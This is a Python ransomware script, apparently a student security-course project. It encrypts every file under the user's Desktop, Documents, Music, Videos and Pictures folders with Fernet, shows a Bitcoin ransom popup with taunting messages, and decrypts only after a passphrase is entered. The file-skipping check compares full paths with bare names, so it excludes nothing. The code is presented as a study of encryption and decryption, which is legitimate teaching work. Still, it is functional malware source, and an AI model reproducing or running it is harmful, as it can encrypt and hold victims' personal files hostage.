# Something Awesome Project - Ransomware
# Yahya Al-Faraj
# z5417171 COMP6841
import os
from cryptography.fernet import Fernet
import tkinter as tk
from tkinter import messagebox
from tkinter import simpledialog


# This is the list of directories that will be targeted.
# This list can be increased or decreased but for the sake of analysing encryption/decryption these will do for now.
directories = ["Desktop", "Documents", "Music", "Videos", "Pictures"]

# This array will contain files that will be encrypted/decrypted.
files = []

# Searching for the files that will be encrypted/decrypted. 
for directory in directories:
    for root, _, filenames in os.walk(os.path.expanduser(f"~/{directory}")):
        for filename in filenames:
            files.append(os.path.join(root, filename))

# This is the encryption key that will be used to encrypt/decrypt. It will be randomly generated. 
key = Fernet.generate_key()
with open("thekey.key", "wb") as thekey:
    thekey.write(key)

# These are files that should never be touched.
forbidden_files = ["README.md", "decrypt.py", "encrypt.py", "decrypt.py", "harmless.py", "thekey.key", "harmless"]

# The encryption process.
for file in files:
    if file in forbidden_files:
        continue
    with open(file, "rb") as thefile:
        contents = thefile.read()
    contents_encrypted = Fernet(key).encrypt(contents)
    with open(file, "wb") as thefile:
        thefile.write(contents_encrypted)

# This section is responsible for communicating with the victim and giving them instructions
root = tk.Tk()
root.withdraw() 
messagebox.showinfo("Encryption Complete", "You have been hacked. Transfer one Bitcoin to us here at *********** to get your files back ;) ")

# Let's imagine that by clicking the ok in the popup that somehow a bitcoin gets transfered...
# I deemed the process of bitcoin transferal not really important as the focus of this project 
# is to analyse how ransomware encrypts/decrypts data on a computer. Bitcoin transferral can always be implemented later

messagebox.showinfo("message", "Bitcoin received, secret code is 'pineapple'. Now running decryption. Click ok to continue.")

# Read the secret key from the key file we created earlier
with open("thekey.key", "rb") as key_file:
    secret_key = key_file.read()

# The secret phrase is required to begin the decryption process
# The idea is that once the funds are transferred, the victim will in exchange receiver this secret phrase
secret_phrase = "pineapple"

#If the victim does not provide the correct phrase then they will not be able to decrypt their files
while True:
    user_input = simpledialog.askstring("Input", "Enter the secret phrase to decrypt your files:")
    if user_input != "pineapple":
        messagebox.showinfo("message", "Try again fool!")
    else:
        # Decryption process
        for file in files:
            if file in forbidden_files:
                continue
            with open(file, "rb") as file_to_decrypt:
                encrypted_content = file_to_decrypt.read()
            decrypted_content = Fernet(secret_key).decrypt(encrypted_content)
            with open(file, "wb") as decrypted_file:
                decrypted_file.write(decrypted_content)

        messagebox.showinfo("message", "Thanks loser :) You can have your files back now")
        break  # Exit the loop when the correct phrase is entered

# These will end the program when the decryption is finished
# If the person does not provide correct secret phrase and does not decrypt their files, the program will keep 
# running and they will not be able to close it.
root.destroy()
root.mainloop() 